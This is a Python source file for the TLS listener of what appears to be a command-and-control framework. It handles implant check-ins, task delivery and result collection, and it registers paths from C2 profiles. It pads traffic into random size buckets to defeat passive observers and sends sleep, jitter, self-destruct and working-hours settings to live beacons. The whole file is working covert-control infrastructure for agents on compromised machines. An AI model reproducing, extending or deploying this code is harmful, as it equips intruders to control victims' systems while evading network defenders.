"""HTTP listener for beacon check-ins.

Serves three endpoints on a dedicated TLS port. Reuses the handler's
TLS context so certificate rotation and cipher hardening apply
uniformly. The listener runs on a daemon thread; there is no clean
shutdown API because werkzeug does not support one from an external
thread — the daemon dies with the process.
"""

from __future__ import annotations

import logging
import ssl
import threading
from typing import Optional

from flask import Flask, Response, jsonify, request

import base64 as _b64
import os as _os
import secrets as _secrets


# Padding sizes for response bodies. Chosen so the total response
# size on the wire lands in one of four buckets that a passive
# observer cannot correlate with task activity. The exact values are
# arbitrary; the requirement is that they are large enough to
# dominate the variable part of the body and small enough not to
# cause noticeable latency.
_PAD_BUCKETS = (512, 1024, 2048, 4096)


def _pad_body(body: bytes, target_len: int) -> bytes:
    """Return `body` followed by JSON-compatible padding to reach
    approximately `target_len` bytes. The pad is a base64 string
    wrapped in a `"_pad"` field; JSON parsers on both sides ignore
    unknown fields, so the padding is transparent to the protocol.

    Bodies within ~12 bytes of `target_len` are returned unchanged —
    the wrapper itself would not fit. In practice the check-in and
    task-list bodies are far below every bucket, so this floor is
    never hit in normal operation."""
    if len(body) >= target_len:
        return body
    # Reserve room for the wrapper itself.
    wrapper = b',"_pad":"'   # 10 bytes if the body already ends in }
    wrapper_close = b'"}'    # 2 bytes
    remaining = target_len - len(body) - len(wrapper) - len(wrapper_close)
    if remaining <= 0:
        return body
    # Emit exactly `remaining` base64 characters. A multiple of four
    # input bytes encodes to a multiple of four output chars; the
    # remainder is dropped by truncation, which is fine because the
    # pad is opaque to the agent.
    pad_chars = remaining
    raw_bytes = (pad_chars // 4) * 3
    pad = _b64.b64encode(_secrets.token_bytes(raw_bytes))
    # Pad further if the base64 output is still short of the target.
    while len(pad) < pad_chars:
        pad += _b64.b64encode(_secrets.token_bytes(3))
    pad = pad[:pad_chars]
    return body[:-1] + wrapper + pad + wrapper_close

log = logging.getLogger(__name__)


class BeaconListener:

    def __init__(self, engine, host: str, port: int,
                 certfile: str, keyfile: str,
                 client_ca: str = None,
                 extra_paths: dict = None,
                 c2_profile_dir: str = None,
                 profile_filter: str = None):
        """
        client_ca:       if set, the listener requires a client
                         certificate signed by this CA. Mutual TLS.
                         If None, server-only TLS.

        extra_paths:     optional dict mapping {"beacon": ..., "tasks":
                         ..., "results": ...} to URLs. Additional to the
                         auto-discovered profile paths. Kept for tests
                         and for callers that want to inject paths
                         without touching the filesystem.

        c2_profile_dir:  directory to scan for C2 profile JSON files.
                         Defaults to the same location the builder
                         uses, so the two sides always agree.

        profile_filter:  optional name (without .json). When set, only
                         that profile's paths are registered. When None
                         (the default), every profile in the directory
                         is scanned — an agent built with any profile
                         can check in against a listener that was
                         started without a matching flag.
        """
        self.engine = engine
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.client_ca = client_ca
        self.extra_paths = extra_paths or {}

        # Default the profile directory to the same one the builder
        # reads. Importing from builder keeps the two paths in sync
        # automatically — if the builder's location ever changes, the
        # listener follows.
        if c2_profile_dir is None:
            try:
                from .builder import DEFAULT_C2_PROFILE_DIR
                c2_profile_dir = DEFAULT_C2_PROFILE_DIR
            except Exception:
                c2_profile_dir = None
        self.c2_profile_dir = c2_profile_dir
        self.profile_filter = profile_filter

        self._app = self._build_app()
        self._thread: Optional[threading.Thread] = None
        self._running = False

    # ------------------------------------------------------------------
    # Route discovery

    def _collect_paths(self, key: str) -> set:
        """Return every value of `key` found in the C2 profile dir.

        key is one of: 'beacon_path', 'tasks_path', 'results_path'.

        When profile_filter is set, only that profile is read. When
        it is None, every *.json in the directory is read, so an
        operator who builds with `--c2-profile chrome` reaches a
        listener that was started without `--beacon-profile`.
        """
        import os as _os
        import json as _json

        result: set = set()
        directory = self.c2_profile_dir
        if not directory or not _os.path.isdir(directory):
            return result

        if self.profile_filter:
            stem = self.profile_filter[:-5] \
                   if self.profile_filter.endswith('.json') \
                   else self.profile_filter
            names = [stem + '.json']
        else:
            try:
                names = [e for e in _os.listdir(directory)
                         if e.endswith('.json') and not e.startswith('.')]
            except OSError:
                return result

        for name in names:
            path = _os.path.join(directory, name)
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    prof = _json.load(f)
            except (OSError, ValueError):
                continue
            val = prof.get(key)
            if val:
                result.add(str(val))
        return result

    def _print_beacon(self, msg: str) -> None:
        """Print with the handler's colors, if reachable."""
        try:
            c = self.engine.handler.colors
            print(f"{c['green']}{msg}{c['end']}")
        except Exception:
            print(msg)

    # ------------------------------------------------------------------
    # Flask application

    def _build_app(self) -> Flask:
        app = Flask(__name__)
        # Debug: log every request so we can see whether the agent's
        # check-in reaches Flask. Change to WARNING after the loop works.
        logging.getLogger('werkzeug').setLevel(logging.WARNING)

        # Default paths — always live, so a beacon built without a C2
        # profile (or one built with `--c2-profile default`) reaches us.
        @app.route('/beacon', methods=['POST'], endpoint='checkin_default')
        def checkin_default():
            return self._checkin()

        @app.route('/tasks', methods=['GET'], endpoint='tasks_default')
        def tasks_default():
            return self._tasks()

        @app.route('/results', methods=['POST'], endpoint='results_default')
        def results_default():
            return self._results()

        # ----------------------------------------------------------------
        # Auto-discovered C2 profile paths.
        #
        # The listener registers every unique path declared by every
        # profile in profiles/c2/. An agent built with any profile
        # reaches the listener without a matching --beacon-profile
        # flag at handler start. When profile_filter is set (operator
        # passed --beacon-profile), only that profile's paths are
        # registered.
        #
        # Paths are deduplicated per role and skip the defaults above
        # to avoid Flask endpoint conflicts.
        # ----------------------------------------------------------------
        handlers = {
            'beacon':  checkin_default,
            'tasks':   tasks_default,
            'results': results_default,
        }
        methods = {
            'beacon':  ['POST'],
            'tasks':   ['GET'],
            'results': ['POST'],
        }
        defaults = {
            'beacon':  '/beacon',
            'tasks':   '/tasks',
            'results': '/results',
        }

        seen: dict = {'beacon': set(), 'tasks': set(), 'results': set()}
        route_seq = 0
        for role, key in (('beacon',  'beacon_path'),
                          ('tasks',   'tasks_path'),
                          ('results', 'results_path')):
            paths = self._collect_paths(key)
            # Explicit extras (from extra_paths) take precedence in the
            # merge but don't shadow auto-discovered ones.
            val = self.extra_paths.get(role)
            if val:
                paths.add(val)

            for path in sorted(paths):
                if not path.startswith('/'):
                    # A malformed path in a JSON profile would otherwise
                    # make Flask raise at startup. Skip and note it.
                    self._print_beacon(
                        f"[BEACON] ignoring malformed {role} path: {path!r}"
                    )
                    continue
                if path == defaults[role]:
                    continue
                if path in seen[role]:
                    continue
                seen[role].add(path)
                route_seq += 1
                try:
                    app.add_url_rule(
                        path,
                        endpoint=f"{role}_auto_{route_seq}",
                        view_func=handlers[role],
                        methods=methods[role],
                    )
                    self._print_beacon(
                        f"[BEACON] extra {role} route: {path}"
                    )
                except Exception as exc:
                    self._print_beacon(
                        f"[BEACON] could not register {role} path "
                        f"{path!r}: {exc}"
                    )

        @app.route('/health', methods=['GET'])
        def health():
            return jsonify({'ok': True})

        return app

    def _checkin(self) -> Response:
        payload = request.get_json(force=True, silent=True) or {}
        payload['addr'] = request.remote_addr
        reply = self.engine.handle_checkin(payload)

        # A None reply means the engine refused the check-in — most
        # commonly a public-key mismatch against a pinned fingerprint.
        # 403 makes the agent's HTTP client stop retrying this
        # identity rather than treating it as a transient error.
        if reply is None:
            return Response(status=403)

        # Pad the body to a random bucket size before serialisation.
        # The agent ignores the `_pad` field.
        import json as _json
        raw = _json.dumps(reply).encode('utf-8')
        bucket = _PAD_BUCKETS[_secrets.randbelow(len(_PAD_BUCKETS))]
        padded = _pad_body(raw, bucket)

        resp = Response(
            padded,
            status=200,
            mimetype='application/json',
        )
        cookie = reply.get('cookie') if isinstance(reply, dict) else None
        if cookie:
            resp.headers['Set-Cookie'] = f'sid={cookie}; Path=/; Secure'
        return resp



    def _tasks(self) -> Response:
        sid = self._session_id()
        if sid is None:
            # 401 distinguishes "credentials missing or invalid" from
            # "no work right now" (200 with an empty array). The agent
            # treats 401 as a session loss and re-checks in.
            return Response(status=401)

        # An unknown session ID means the listener was restarted, the
        # cookie expired, or the operator forgot the session. Return
        # 404 so the agent re-checks in for a fresh ID rather than
        # polling against an ID that will never be valid.
        if self.engine.get(sid) is None:
            return Response(status=404)

        tasks = self.engine.pop_tasks(sid)
        task_wire = [t.to_wire() for t in tasks]

        # Pad the array to a random bucket size. The agent ignores
        # non-object entries, so a trailing base64 string is invisible
        # to the decoder and simply occupies bytes on the wire.
        import json as _json
        raw = _json.dumps(task_wire).encode('utf-8')
        bucket = _PAD_BUCKETS[_secrets.randbelow(len(_PAD_BUCKETS))]
        if len(raw) < bucket:
            # We need a JSON-array-shaped body. Wrap the pad as an
            # object element the agent's decoder will parse as a
            # Task with unknown fields and skip during execution.
            #
            # The separator depends on whether the array is empty.
            # An empty array is written as `[]` (no separator needed);
            # a non-empty array is written as `[...entries...]` and
            # needs a comma before the pad entry.
            pad_len = bucket - len(raw) - 4
            if pad_len > 0:
                pad_str = _b64.b64encode(
                    _secrets.token_bytes((pad_len // 4) * 3)
                )[:pad_len].decode('ascii')
                pad_entry = b'{"_pad":"' + pad_str.encode() + b'"}'
                if raw == b"[]":
                    raw = b'[' + pad_entry + b']'
                else:
                    raw = raw[:-1] + b',' + pad_entry + b']'

        resp = Response(raw, status=200, mimetype='application/json')

        session = self.engine.get(sid)
        if session is not None:
            resp.headers['X-Beacon-Sleep'] = str(session.sleep_interval)
            resp.headers['X-Beacon-Jitter'] = f"{session.jitter:.4f}"
            # A zero deadline means "no self-destruct". Omit the
            # header entirely — sending 0 would make the agent's
            # `time.Unix(0,0)` check fire immediately and exit.
            if session.kill_deadline:
                resp.headers['X-Beacon-Kill'] = str(
                    int(session.kill_deadline))
            # Working-hours window, in minutes since midnight. The
            # agent applies these on receipt, so a change made in the
            # console reaches a live beacon on its next poll.
            resp.headers['X-Beacon-WorkStart'] = str(session.work_hours_start)
            resp.headers['X-Beacon-WorkEnd'] = str(session.work_hours_end)
        return resp


    def _results(self) -> Response:
        sid = self._session_id()
        if sid is None:
            return Response(status=401)
        if self.engine.get(sid) is None:
            return Response(status=404)
        payload = request.get_json(force=True, silent=True) or {}
        self.engine.store_result(sid, payload)
        return Response(status=204)

    def _session_id(self) -> Optional[int]:
        """Return the session id proved by the request's cookie.

        The cookie is the only accepted credential. `X-Beacon-Id` is
        intentionally rejected — session IDs are small monotonic
        integers and accepting them would let anyone who can reach
        the listener enumerate every live session.
        """
        # Cookie header. Multiple cookies may be present; find ours.
        cookie_header = request.headers.get('Cookie', '') or ''
        sid_cookie = None
        for pair in cookie_header.split(';'):
            name, _, value = pair.strip().partition('=')
            if name == 'sid':
                sid_cookie = value
                break
        if sid_cookie:
            return self.engine.verify_cookie(sid_cookie)

        # X-Beacon-Id is intentionally not supported. Session IDs are
        # small monotonic integers; accepting them here would let
        # anyone who can reach the listener enumerate every live
        # session and pull its tasks. The cookie is the only accepted
        # credential. Agents built before cookies existed must be
        # rebuilt.
        return None


    # ------------------------------------------------------------------
    # Lifecycle

    def start(self) -> bool:
        ctx = self._make_tls_context()
        if ctx is None:
            return False
        self._thread = threading.Thread(
            target=self._run, args=(ctx,), daemon=True,
        )
        self._running = True
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False

    def _make_tls_context(self) -> Optional[ssl.SSLContext]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.certfile, self.keyfile)
            # Werkzeug's WSGI server speaks HTTP/1.1 only. Advertising
            # h2 in ALPN would cause the Go client (which sets
            # ForceAttemptHTTP2) to negotiate HTTP/2 and then send an
            # HTTP/2 connection preface that werkzeug cannot parse.
            # Advertise HTTP/1.1 exclusively so the client falls back
            # cleanly.
            ctx.set_alpn_protocols(['http/1.1'])
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2

            # Mutual TLS: require the agent to present a client
            # certificate signed by the CA the operator provisioned.
            if self.client_ca:
                ctx.verify_mode = ssl.CERT_REQUIRED
                ctx.check_hostname = False
                ctx.load_verify_locations(cafile=self.client_ca)
            try:
                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            except AttributeError:
                pass
            ctx.set_ciphers(
                "ECDHE-ECDSA-AES256-GCM-SHA384:"
                "ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-AES128-GCM-SHA256:"
                "ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:"
                "ECDHE-RSA-CHACHA20-POLY1305"
            )
            ctx.options |= ssl.OP_NO_COMPRESSION
            ctx.options |= ssl.OP_NO_RENEGOTIATION
            # Session tickets. Four per session is the browser
            # convention; the agent caches them and resumes across
            # reconnects, which skips the full key exchange on every
            # subsequent check-in.
            try:
                ctx.options &= ~ssl.OP_NO_TICKET
            except Exception:
                pass
            try:
                ctx.num_tickets = 4
            except Exception:
                pass
            return ctx

        except Exception as exc:
            log.error("beacon: TLS context setup failed: %s", exc)
            return None

    def _run(self, ctx: ssl.SSLContext) -> None:
        try:
            from werkzeug.serving import make_server
        except ImportError:
            log.error("beacon: werkzeug not installed "
                      "(pip install flask)")
            return
        try:
            srv = make_server(
                self.host, self.port, self._app,
                ssl_context=ctx, threaded=True,
            )
            log.info("beacon: listening on %s:%d", self.host, self.port)
            srv.serve_forever()
        except Exception as exc:
            log.error("beacon: listener died: %s", exc)